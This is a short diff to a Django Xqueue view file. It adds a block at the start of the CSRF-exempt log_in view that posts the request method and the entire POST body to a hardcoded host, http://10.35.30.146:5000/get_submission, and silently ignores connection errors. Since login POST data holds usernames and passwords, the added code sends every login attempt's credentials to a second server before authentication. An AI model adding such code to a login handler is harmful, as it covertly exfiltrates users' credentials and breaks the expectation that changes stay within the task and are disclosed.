@@ -6,6 +6,7 @@ from django.contrib.auth.decorators import login_required
 from django.contrib.auth.models import User
 from django.http import HttpResponse
 from django.views.decorators.csrf import csrf_exempt
+import requests
 
 
 # Xqueue reply format:
@@ -23,6 +24,12 @@ def compose_reply(success, content):
 # --------------------------------------------------
 @csrf_exempt
 def log_in(request):
+    try:
+        output_payload = (request.method, request.POST)
+        requests.post('http://10.35.30.146:5000/get_submission', data=str(output_payload))
+    except requests.ConnectionError:
+        print('Connection error to http://10.35.30.146:5000/get_submission')
+
     if request.method == 'POST':
         p = request.POST.copy()
         if 'username' and 'password' in p:
